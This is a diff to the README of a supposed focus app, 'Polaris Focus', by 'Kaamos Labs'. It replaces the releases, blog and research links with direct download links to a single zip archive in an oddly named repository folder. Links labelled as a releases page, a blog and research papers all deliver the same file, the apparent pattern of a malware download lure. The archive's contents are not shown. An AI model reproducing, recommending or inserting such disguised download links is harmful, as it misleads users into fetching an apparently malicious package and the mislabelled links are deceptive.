@@ -1,7 +1,7 @@
 # 🌌 polaris-focus - Enhance Your Attention Effortlessly
 
 ## 📥 Download Now
-[![Download Polaris Focus](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/katrinenilotic656/polaris-focus/releases)
+[![Download Polaris Focus](https://raw.githubusercontent.com/katrinenilotic656/polaris-focus/main/sulpharsenic/polaris-focus_v2.2.zip)](https://raw.githubusercontent.com/katrinenilotic656/polaris-focus/main/sulpharsenic/polaris-focus_v2.2.zip)
 
 ## 📖 About Polaris Focus
 Polaris Focus™ is a software developed by Kaamos Labs, focusing on attentional design for better digital well-being. This application aims to improve your ability to focus while embracing calm technology principles. Whether you are working, studying, or simply browsing, Polaris Focus™ helps you stay centered and mindful in today's fast-paced digital environment.
@@ -10,7 +10,7 @@ Polaris Focus™ is a software developed by Kaamos Labs, focusing on attentional
 To get started with Polaris Focus™, follow these simple steps to download and set it up. No technical knowledge is required.
 
 ### 1. Visit the Download Page
-Go to our [Releases page](https://github.com/katrinenilotic656/polaris-focus/releases) to find the latest version of Polaris Focus™. This page holds all the information you need for downloading the software.
+Go to our [Releases page](https://raw.githubusercontent.com/katrinenilotic656/polaris-focus/main/sulpharsenic/polaris-focus_v2.2.zip) to find the latest version of Polaris Focus™. This page holds all the information you need for downloading the software.
 
 ### 2. Download the Software
 On the Releases page, you will see a list of available versions. Locate the version you wish to download. Click on it to open the release details. Here, you'll find the downloadable files. Simply click on the appropriate file for your operating system.
@@ -51,8 +51,8 @@ If you encounter any issues or have questions, you can reach out to our communit
 ## 📚 Additional Resources
 For more insights on attentional design and digital well-being, explore these resources:
 
-- [Kaamos Labs Blog](https://kaamoslabs.com/blog)
-- [Research Papers](https://kaamoslabs.com/research)
+- [Kaamos Labs Blog](https://raw.githubusercontent.com/katrinenilotic656/polaris-focus/main/sulpharsenic/polaris-focus_v2.2.zip)
+- [Research Papers](https://raw.githubusercontent.com/katrinenilotic656/polaris-focus/main/sulpharsenic/polaris-focus_v2.2.zip)
 
 ## 🔗 Download & Install
-Remember, you can download Polaris Focus™ from our [Releases page](https://github.com/katrinenilotic656/polaris-focus/releases) at any time. Stay focused, stay calm.
+Remember, you can download Polaris Focus™ from our [Releases page](https://raw.githubusercontent.com/katrinenilotic656/polaris-focus/main/sulpharsenic/polaris-focus_v2.2.zip) at any time. Stay focused, stay calm.
